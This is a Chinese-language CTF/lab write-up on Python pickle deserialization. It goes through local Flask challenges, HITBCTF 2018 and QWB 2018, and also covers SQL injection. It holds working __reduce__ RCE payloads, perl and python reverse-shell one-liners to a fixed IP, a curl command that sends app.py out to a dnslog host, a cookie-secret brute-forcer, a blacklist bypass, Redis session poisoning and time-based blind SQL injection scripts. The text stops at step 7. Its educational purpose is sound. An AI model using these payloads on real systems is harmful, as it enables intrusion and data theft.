## 0x00 Python反序列化漏洞介绍
之前在CTF的比赛中遇到了Python的反序列化问题，所以就整合了一下Python反序列化的内容

* 什么是序列化

在程序运行的过程中，所有的变量都是在内存中，但是当程序结束之后变量所占用的内存就被操作系统全部回收。但是我们把内存中的数据导入到磁盘中，下次运行的时候再载入可以确保内存的一致性。我们把变量从内存中变成可存储或传输的过程称之为序列化，反之就是反序列化

* 序列化的应用场景

数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收

* Python中可以被序列化/反序列化的数据

None, True, 和 False
整形、浮点、复数
strings, bytes, bytearrays
元组, 列表, 集合, 和 只包含可序列化对象的字典
定义在模块顶层的函数（lambda表达式不可以）
定义在模块顶层的内建函数
定义在模块顶层类

* 反序列化漏洞的危害

最常见的以及危害最深的就是RCE，其他还包括远程文件的读取和写入等

## 0x01 Python中序列化的实现方式

### pickle/cPickle
pickle模块对Python对象执行序列化和反序列化最常利用到的模块。Python的任何对象都可以通过它永久保存到硬盘文件。Pickle实际上是先把Python对象（list、dict、class等）转换为字符流。cPickle是pickle的C模块，速度上比pickle快了很多，但在python3之后cpickle合并到了pickle中去了

pickle主要提供了四个函数用来进行序列化/反序列化操作
序列化函数
dump和dumps

**pickle.dump(obj, file, protocol=None, *, fix_imports=True)**，最重要的是前两个参数，该方法将obj对象序列化为字节（bytes）输出到file文件中。

**pickle.dumps(obj, protocol=None, *, fix_imports=True)**，该方法将obj对象序列化并返回一个bytes对象（在Python2中名字叫str）。

反序列化函数
load和loads

**pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict")**，从一个对象文件中读取序列化数据，将其反序列化之后返回一个对象。
**pickle.loads(bytes_object, *, fix_imports=True, encoding="ASCII", errors="strict")**，将一个bytes对象反序列化并返回一个对象。

**pickle模块还提供一个Pickler类和Unpickler类，用法类似，不过是只能从文件中读取和输出到文件**

class pickle.Pickler(file, protocol=None,*,fix_imports=True),Pickler类有dump()方法。Pickler(file, protocol).dump(obj) 实现的功能跟 pickle.dump() 是一样的

class pickle.Unpickler(file, *,fix_imports=True, encoding="ASCII". errors="strict"),Pickler类有load()方法。
Unpickler(file).load() 实现的功能跟 pickle.load() 是一样的

利用函数序列化/反序列化的代码
```
import pickle#序列化数组hack_list = ["shadow", "s1riu5", "pickle"]file_seri = open("mess.txt", "wb")seri_list = pickle.dumps(hack_list)print(seri_list)result = pickle.dump(hack_list, file_seri)file_seri.close()temp = pickle.loads(seri_list)dji = open("mess.txt", "rb")temp2 = pickle.load(dji)print(temp)print(temp2)pickler_file = open("shadow", "wb")second_seri = pickle.Pickler(pickler_file).dump(hack_list)pickler_file.close()unpickler_file = open("shadow", "rb")result_unpickler = pickle.Unpickler(unpickler_file).load()print(result_unpickler)unpickler_file.close()
```

![](README/luffy1%204.png)

### json实现
pickle方法是Python中专有的序列化模块，和其他平台多少有点兼容问题，json作为更为标准的格式，具有更好的可读性（pickle是二进制数据）和跨平台性

### shelve模块
该模块不是很常用

## 0x02 反序列化漏洞原理
官方文档中说过，pickle是个不安全的模块，永远别去反序列化不信任的数据。

这一切都是因为__reduce__ 魔术方法，它在序列化的时候会完全改变被序列化的对象.类似于php的wakeup魔术方法，python中的__reduce__，可以在被反序列化的时候执行.类似于php的wakeup魔术方法，python中的__reduce__，可以在被反序列化的时候执行，而pickle.loads是会解决import 问题，对于未引入的module会自动尝试import。这也意味着可以导入命令执行的包进行操作

```
import pickle
import os

class eval_code(object):

     def __reduce__(self):
         return (os.system,('whoami',))


eval_whoami = eval_code()

mess = pickle.dumps(eval_whoami)

print(mess)

shadow = pickle.loads(mess)

```

![](README/luffy2%204.png)

## 0x03 漏洞案例
案例一: 以P神搭建的环境为例
```
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    try:
        user = base64.b64decode(request.cookies.get('user'))
        user = pickle.loads(user)
        username = user["username"]
    except:
        username = "Guest"

    return "Hello %s" % username

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

命令执行

```
*import*pickle
*import*os
*import*base64
*import*requests

*class*eval_code(object):

    *def*__reduce__(self):
        *return*(os.system,(*'touch /1.txt'*,))


eval_whoami = eval_code()
shadow = base64.b64encode(pickle.dumps(eval_whoami))

*print*([pickle.dumps(eval_whoami)])
*print*(shadow)

mess = requests.get(*"http://127.0.0.1"*, cookies=dict(user=shadow))
*print*(mess.content)


```

![](README/luffy3%204.png)

![](README/luffy4%204.png)

反弹shell
现在本地监听
```
socat tcp-listen:6080 -
```

然后执行exp

```
import pickle
import os
import requests
import base64
import commands

class exp(object):
    def __reduce__(self):
        s =  """ perl -e 'use Socket;$i="172.168.46.145";$p=6080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}'"""
        return (os.system, (s,))

       # s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.168.46.45",6080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        # return (commands.getoutput, (s,))

e = exp()
s = pickle.dumps(e)

print ([s])
shadow = base64.b64encode(s)

mess = requests.get("http://127.0.0.1", cookies=dict(user=shadow))
print(mess.content)


```

![](README/luffy5%204.png)

![](README/luffy6%204.png)

利用dnslog回显信息

```
*import*pickle
*import*os
*import*requests
*import*base64


*class*exp(object):
    *def*__reduce__(self):
        s = *""" curl test.dnslog.link/`cat /app/app.py|base64|tr '\n' '-'` """*
*        return*(os.system, (s,))

        /# s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.168.46.45",6080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""/
/        # return (commands.getoutput, (s,))/

e = exp()
s = pickle.dumps(e)

*print*([s])
shadow = base64.b64encode(s)

mess = requests.get(*"http://127.0.0.1"*, cookies=dict(user=shadow))
*print*(mess.content)

```

案例二:HITBCTF 2018

```

from flask import Flask, request, make_response, redirect, url_for, session
from flask import render_template, flash, redirect, url_for, request
from werkzeug.security import safe_str_cmp
from base64 import b64decode as b64d
from base64 import b64encode as b64e
from hashlib import sha256
from cStringIO import StringIO
import random
import string

import os
import sys
import subprocess
import commands
import pickle
import cPickle
import marshal
import os.path
import filecmp
import glob
import linecache
import shutil
import dircache
import io
import timeit
import popen2
import code
import codeop
import pty
import posixfile

SECRET_KEY = 'you will never guess'

if not os.path.exists('.secret'):
    with open(".secret", "w") as f:
        secret = ''.join(random.choice(string.ascii_letters + string.digits)
                         for x in range(4))
        f.write(secret)
with open(".secret", "r") as f:
    cookie_secret = f.read().strip()

app = Flask(__name__)
app.config.from_object(__name__)

black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]


@app.before_request
def count():
    session['cnt'] = 0


@app.route('/')
def home():
    remembered_str = 'Hello, here\'s what we remember for you. And you can change, delete or extend it.'
    new_str = 'Hello fellow zombie, have you found a tasty brain and want to remember where? Go right here and enter it:'
    location = getlocation()
    if location == False:
        return redirect(url_for("clear"))
    return render_template('index.html', txt=remembered_str, location=location)


@app.route('/clear')
def clear():
    print("Reminder cleared!")
    response = redirect(url_for('home'))
    response.set_cookie('location', max_age=0)
    return response


@app.route('/reminder', methods=['POST', 'GET'])
def reminder():
    if request.method == 'POST':
        location = request.form["reminder"]
        if location == '':
            print("Message cleared, tell us when you have found more brains.")
        else:
            print("We will remember where you find your brains.")
        location = b64e(pickle.dumps(location))
        cookie = make_cookie(location, cookie_secret)
        response = redirect(url_for('home'))
        response.set_cookie('location', cookie)
        print 'location'
        return response
    location = getlocation()
    if location == False:
        return redirect(url_for("clear"))
    return render_template('reminder.html')


class FilterException(Exception):
    def __init__(self, value):
        super(FilterException, self).__init__(
            'The callable object {value} is not allowed'.format(value=str(value)))


class TimesException(Exception):
    def __init__(self):
        super(TimesException, self).__init__(
            'Call func too many times!')


def _hook_call(func):
    def wrapper(*args, **kwargs):
        session['cnt'] += 1
        print session['cnt']
        print args[0].stack
        for i in args[0].stack:
            if i in black_type_list:
                raise FilterException(args[0].stack[-2])
            if session['cnt'] > 4:
                raise TimesException()
        return func(*args, **kwargs)
    return wrapper


def loads(strs):
    reload(pickle)
    files = StringIO(strs)
    unpkler = pickle.Unpickler(files)
    print strs,files,unpkler
    unpkler.dispatch[pickle.REDUCE] = _hook_call(
        unpkler.dispatch[pickle.REDUCE])
    return unpkler.load()


def getlocation():
    cookie = request.cookies.get('location')
    if not cookie:
        return ''
    (digest, location) = cookie.split("!")
    print (digest, location),calc_digest(location, cookie_secret)
    if not safe_str_cmp(calc_digest(location, cookie_secret), digest):
        print("Hey! This is not a valid cookie! Leave me alone.")

        return False
    location = loads(b64d(location))
    return location


def make_cookie(location, secret):
    return "%s!%s" % (calc_digest(location, secret), location)


def calc_digest(location, secret):
    return sha256("%s%s" % (location, secret)).hexdigest()


if __name__ == '__main__':

    app.run(host="0.0.0.0", port=80)

```

漏洞的根源在
```

*def*loads(strs):
    reload(pickle)
    files = StringIO(strs)
    unpkler = pickle.Unpickler(files)
    *print*strs,files,unpkler
    unpkler.dispatch[pickle.REDUCE] = _hook_call(
        unpkler.dispatch[pickle.REDUCE])
    *return*unpkler.load()

```

而漏洞的调用顺序是
**reminder -> getlocation -> loads**

但是这边有一个条件
![](README/luffy7%204.png)
在这里面location和digest都可以通过cookie调用，但是cookie_secret是不知道的，追踪了一下
发现cookie_secret中的值是四位包含了大小写字母和数字的字符串，可以通过已知条件进行爆破
首先我们发送一下luffy看一下返回的cookie
![](README/luffy9%204.png)

爆破cookie_secret
```
*import*string
*import*time
*from*hashlib *import*sha256
*import*sys

char = string.ascii_letters + string.digits


time_start=time.time()

*for*i *in*char:
    *for*j *in*char:
        *for*x *in*char:
            *for*y *in*char:
                flag = i+j+x+y

                sha = sha256(*"%s%s"*% (*"Vmx1ZmZ5CnAwCi4="*, flag)).hexdigest()

                *if*sha == *"23d325e6647915ee00c719b1b51275d18221453f53917403730a0dd4ff5ddcee"*:
                    *print*(flag)

                    time_end = time.time()

                    *print*time_end - time_start
                    sys.exit()


```

![](README/luffy10%204.png)

除此之外，这边还有一个黑名单
**black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]**

利用platform库可以绕过

```
*import*pickle
*import*base64
*from*hashlib *import*sha256
*import*platform
*import*requests

*class*eval_code(object):

    *def*__reduce__(self):
        /#platform.popen("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")/

*return*(platform.popen,(*"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.168.46.145\",6080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"*,))


eval_whoami = eval_code()
location = base64.b64encode(pickle.dumps(eval_whoami))

digest = sha256(*"%s%s"*% (location, *"Wtu9"*)).hexdigest()

cookie = *"%s!%s"*% (digest, location)


mess = requests.get(*"http://127.0.0.1:81/reminder"*, cookies=dict(location=cookie))
*print*(mess.content)

```
![](README/luffy11%206.png)


案例三: flask-session+redis漏洞
session存取过程存在序列化和反序列化的过程。
session在Redis中以键值对（key，value）的形式存储。假设我们能够操纵Redis中的键值对，将某个key的值设为我们序列化后恶意代码（比如上面反弹shell的代码样例），然后在将自身的cookie设置为该key，在访问网站的时候，服务端会对于根据key查找value并进行反序列化，进而反弹shell。
先看一下session
![](README/luffy12%206.png)

然后看一下redias的内容
![](README/luffy13%206.png)

制作代码

```
*import*pickle
*import*platform
*import*redis

*class*eval_code(object):

    *def*__reduce__(self):
        /#platform.popen("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")/

*return*(platform.popen,(*"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.168.46.145\",6080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"*,))


eval_whoami = eval_code()

payload = pickle.dumps(eval_whoami)


r = redis.Redis(host=*'127.0.0.1'*,port=6379)
r.set(*'sessionluffy6a3-cedc-4c50-a66a-57f5124a6f2a'*,payload)

```

![](README/luffy14%206.png)

![](README/luffy15%206.png)

![](README/luffy16%206.png)


案例四: 
这是强网杯2018的题目,强网杯只给了源代码，需要自己创建数据库，
app目录下的几个文件
routes.py 主要是路由的一些配置
models.py 则是数据库的结构配置
forms.py 是表单的配置
others.py 则是sql拼接的配置

![](README/luffy11%207.png)

拼接很容易产生sql注入的问题，然后查看routse.py有哪些路由配置方案
 在routes.py中进行mysql操作的一共有六处
```
#此处传递的参数来在与session，黑客无法操控
@app.before_request
def before_request():
    if current_user.is_authenticated:
        mysql.Mod('user', {"id": current_user.id}，{"last_seen": "'%s'" % now()})

# 此处的数据库操作参数来自于PostForm
def index():
    form = PostForm()
    if form.validate_on_submit():
        res = mysql.Add("post", ['NULL', "'%s'" % form.post.data,
                                 "'%s'" % current_user.id, "'%s'" % now()])
        if res == 1:
# 此处的参数也没办法操控
def explore():
    page = request.args.get('page', 1, type=int)
    page = page if page > 0 else 1
    all_posts = mysql.All("post", order=["id desc"])
    post_per_page = app.config['POSTS_PER_PAGE']

#  此处的参数来自于RegistrationForm
def register():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = RegistrationForm()
    if form.validate_on_submit():
        res = mysql.Add("user", ["NULL", "'%s'" % form.username.data, "'%s'" % form.email.data,
                                 "'%s'" % generate_password_hash(form.password.data), "''", "'%s'" % now()])

#此处的参数来自于EditProfileForm
def edit_profile():
    form = EditProfileForm(current_user.username)
    if form.validate_on_submit():
        current_user.username = form.username.data
        current_user.note = form.note.data
        res = mysql.Mod("user", {"id": current_user.id}, {
                        "username": "'%s'" % current_user.username, "note": "'%s'" % current_user.note})
```

 这样查完的话会发现，用户可以操作的数据主要来自于三个表单模型PostForm, RegistrationForm和EditProfileForm
这三个表单模型的代码定义于forms.py 

```

class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    email = StringField('Email', validators=[DataRequired(), Email()])
    password = PasswordField('Password', validators=[DataRequired()])
    password2 = PasswordField(
        'Repeat Password', validators=[DataRequired(), EqualTo('password')])
    submit = SubmitField('Register')

    def validate_username(self, username):
        if re.match("^[a-zA-Z0-9_]+$", username.data) == None:
            raise ValidationError('username has invalid charactor!')
        user = mysql.One("user", {"username": "'%s'" % username.data}, ["id"])

        if user != 0:
            raise ValidationError('Please use a different username.')



class EditProfileForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    note = StringField('About me', validators=[])
    submit = SubmitField('Submit')

    def __init__(self, original_username, *args, **kwargs):
        super(EditProfileForm, self).__init__(*args, **kwargs)
        self.original_username = original_username

    def validate_username(self, username):
        if re.match("^[a-zA-Z0-9_]+$", username.data) == None:
            raise ValidationError('username has invalid charactor!')

        if username.data == current_user.username:
            pass
        else:
            user = mysql.One(
                "user", {"username": "'%s'" % username.data}, ["id"])
            if user != 0:
                raise ValidationError('Please use a different username.')

    def validate_note(self, note):
        if re.match("^[a-zA-Z0-9_\'\(\) \.\_\*\`\-\@\=\+\>\<]*$", note.data) == None:
            raise ValidationError("Don't input invalid charactors!")


class PostForm(FlaskForm):
    post = StringField('Say something', validators=[DataRequired()])
    submit = SubmitField('Submit')

```


其中EditProfileForm的参数利用正则进行了过滤，这样的话只剩下PostForm和
RegistrationForm
PostForm中只确认了数据不能不能为空，完全没有过滤.
RegistrationForm中用的是username字段用的是**^[a-zA-Z0-9_]+$**进行正则过滤，但是email字段用的是wtforms.validators的Email验证，在WTForm的版本低于2.1的时候，正则是有问题的
![](README/luffy12%207.png)

这个正则既没有过滤`，也有过滤#,可以进行绕过，但是WTForm的版本大于2.1的时候，开发者重写了正则表达式，对于一些特殊字符进行了过滤，无法再进行注入了

首先将网站运行起来
将app目录下的models.py复制成db.py,转移到和app同级的目录下

在db.py中需要加一些新的代码
```
from sqlalchemy import create_engine
from sqlalchemy.ext.declarative import declarative_base, DeferredReflection


SQLALCHEMY_DATABASE_URI = "mysql://root:shadow@localhost/flask?charset=utf8"
engine=create_engine(SQLALCHEMY_DATABASE_URI,echo=True)
Base=declarative_base()


class Followers(Base):
    __tablename__ = 'followers'
    id = Column(Integer, primary_key=True)
    follower_id = Column('follower_id', Integer, ForeignKey('user.id'))
    followed_id = Column('followed_id', Integer, ForeignKey('user.id'))

....


Base.metadata.create_all(engine)
```

到容器里创建一个名为flask的数据库,然后执行db.py就可以创建数据库了，
![](README/luffy13%207.png)

创建完成之后在容器中执行python run.py 

![](README/luffy14%207.png)

注册一个新用户登陆,由于PostForm没有对用户验证，所以用PostForm测试注入
![](README/luffy15%207.png)

![](README/luffy16%207.png)
可以看到执行的语句是
	
```
insert into post values (NULL,'luffy','1','2018-09-12')
```
是一个典型的inser注入
1.查询当前使用的数据库版本
```
luffy','1','2018-09-12'),(NULL, (select database()),'1','2018-09-12')#
拼接后就是
insert into post values (NULL,'luffy','1','2018-09-12'),(NULL, (select database()),'1','2018-09-12')#','1','2018-09-12')

```
![](README/luffy17%203.png)

为了测试，我创建了一个flag表

查表

```
luffy','1','2018-09-12'),(NULL, (select group_concat(table_name) from information_schema.tables where TABLE_SCHEMA='flask'),'1','2018-09-12')#
```


![](README/luffy18%203.png)

查列
```
luffy','1','2018-09-12'),(NULL, (select group_concat(column_name) from information_schema.columns where TABLE_SCHEMA='flask' and TABLE_NAME='flag'),'1','2018-09-12')#
```

![](README/luffy19%203.png)

 最后查flag的内容
```
luffy','1','2018-09-12'),(NULL, (select fllllag  from flag),'1','2018-09-12')#
```

![](README/luffy20%203.png)

此外，为了防止数据被轻易看到，可以利用mysql的encode函数进行加密
```
luffy','1','2018-09-12'),(NULL, hex(encode((select fllllag  from flag), 'shadow')),'1','2018-09-12')#
```

![](README/luffy21%202.png)
解密的话只要执行
```
select decode(unhex('2C362A34F6E0'),'shadow');
```

![](README/luffy22%202.png)
基于时间的盲注
正好趁着机会，测试一下基于时间的注入

1. 测试数据库长度
```
#前面的1是必须的
1' and if(length(database())=2, sleep(10), 1),'1','2018-09-12')#
```

转成python脚本
```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(1, 8):

    time_start = time.time()

    burp0_data={"csrf_token": token, "post": "1' and if(length(database())={num}, sleep(10), 1),'1','2018-09-12')#".format(num=i), "submit": "Submit"}
    response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

    time_end = time.time()

    if time_end-time_start > 10:
        print(i)

```
结果是5
![](README/luffy23%202.png)

2. 测试数据库名字
```
1' and if(ascii(substr(database(),{index},1))={num}, sleep(10), 1),'1','2018-09-12')#
```

转python脚本
```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(1, 6):

    for j in range(32, 127):

        time_start = time.time()

        burp0_data={"csrf_token": token, "post": "1' and if(ascii(substr(database(),{index},1))={num}, sleep(10), 1),'1','2018-09-12')#".format(index=i,num=j), "submit": "Submit"}
        response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

        time_end = time.time()

        if time_end-time_start > 10:
            print(chr(j))

```

![](README/luffy24%202.png)
数据库名称是flask

3. 判断flask库中有几个表
```
1' and if((select count(*) from information_schema.tables where table_schema='flask')=1, sleep(10), 1),'1','2018-09-12')#
```
python

```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(1, 8):

    time_start = time.time()

    burp0_data = {
        "csrf_token": token,
        "post": "1' and if((select count(*) from information_schema.tables where table_schema='flask')={num}, sleep(10), 1),'1','2018-09-12')#".format(num=i),
        "submit": "Submit"}

    response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

    time_end = time.time()

    if time_end-time_start > 10:
        print(i)

```

只有三个表

![](README/luffy25%202.png)

4. 判断三个表的长度
```
1' and if((select length(table_name) from information_schema.tables where table_schema='flask' limit 0,1 )=1, sleep(10), 1),'1','2018-09-12')#
```

python脚本
```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(0, 3):

    for j in range(1, 20):

        time_start = time.time()

        burp0_data = {
            "csrf_token": token,
            "post": "1' and if((select length(table_name) from information_schema.tables where table_schema='flask' limit {index},1 )={num}, sleep(10), 1),'1','2018-09-12')#".format(index=i, num=j),
            "submit": "Submit"}

        response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

        time_end = time.time()

        if time_end-time_start > 10:
            print(j)
            break

```

5. 判断第一个表的内容
```
1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='flask' limit 1,1),1,1))=32, sleep(10), 1),'1','2018-09-12')#
```

转换为python脚本
```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(1, 10):

    for j in range(32, 127):

        time_start = time.time()

        burp0_data = {
            "csrf_token": token,
            "post": "1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='flask' limit 1,1),{index},1))={num}, sleep(10), 1),'1','2018-09-12')#".format(index=i, num=j),
            "submit": "Submit"}


        response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

        time_end = time.time()

        if time_end-time_start > 10:
            print(chr(j))
            break

```

![](README/luffy27%202.png)

6. 判断flask数据库中post表的列数量
```
1' and if((select count(*) from information_schema.columns where table_schema='flask' and table_name='user')=3, sleep(10), 1),'1','2018-09-12')#
```

python脚本
```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(1, 10):

    for j in range(1, 2):

        time_start = time.time()
        burp0_data = {
            "csrf_token": token,
            "post": "1' and if((select count(*) from information_schema.columns where table_schema='flask' and table_name='user')={num}, sleep(10), 1),'1','2018-09-12')#".format(num=i),
            "submit": "Submit"}

        response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

        time_end = time.time()

        if time_end-time_start > 10:
            print(i)
            break

```
![](README/luffy28%202.png)

7. 判断六个列的长度

```
